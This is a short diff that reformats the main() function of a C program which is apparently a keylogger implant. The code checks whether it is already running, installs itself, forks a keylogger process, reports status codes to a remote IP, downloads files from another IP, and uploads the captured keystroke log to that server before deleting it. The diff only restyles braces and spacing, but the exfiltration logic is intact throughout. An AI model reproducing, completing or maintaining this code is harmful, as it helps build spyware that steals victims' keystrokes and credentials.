@@ -36,14 +36,16 @@ int main()
 
 	// If its running stop
 	upload_data(ip_addr[0], "210");
-	if (already_running() == OK) {
+	if (already_running() == OK)
+	{
 		upload_data(ip_addr[0], "411");
 		goto FREE_0;
 	}
 
 	// If its installed continue, if not install and stop
 	upload_data(ip_addr[0], "720");
-	if (install() != OTHER) {
+	if (install() != OTHER)
+	{
 		upload_data(ip_addr[0], "921");
 		goto FREE_0;
 	}
@@ -51,7 +53,8 @@ int main()
 	pid = fork();
 
 	// Start keylogger
-	if (pid == 0) {
+	if (pid == 0)
+	{
 		upload_data(ip_addr[0], "530");
 		init_keylogger();
 		goto FREE_0;
@@ -68,25 +71,29 @@ int main()
 		download_file(ip_addr[3], 0);
 
 	// Wait and ping
-	for (i = 0; i < MAX_LOOPS; i++) {
+	for (i = 0; i < MAX_LOOPS; i++)
+	{
 		upload_data(ip_addr[0], "800");
 		sleep(MAX_SECONDS / MAX_LOOPS);
 	}
 
 	// Upload keylogger data
 	bl = fopen(BL, "rb+");
-	if (!bl) {
+	if (!bl)
+	{
 		upload_data(ip_addr[0], "441");
-	} else {
+	}
+	else
+	{
 		upload_data(ip_addr[0], "140");
 		upload_file(ip_addr[0], bl);
 		fclose(bl);
 		remove(BL);
 	}
 
-	FREE_0:
+FREE_0:
 	// Free decrypted ip
-	for (i=0; i<5; i++)
+	for (i = 0; i < 5; i++)
 		free(ip_addr[i]);
 
 	upload_data(ip_addr[0], "760");
